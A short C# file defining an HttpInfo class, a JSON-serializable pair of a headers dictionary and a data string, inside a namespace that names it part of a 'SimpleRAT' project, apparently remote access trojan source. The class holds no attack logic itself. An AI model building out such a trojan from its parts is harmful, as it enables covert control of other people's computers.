using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SimpleRAT.Communication.ResponseTypes
{
    public class HttpInfo
    {
        [JsonProperty("headers")]
        public Dictionary<string, string> Headers { get; set; }

        [JsonProperty("data")]
        public string Data { get; set; }
    }
}
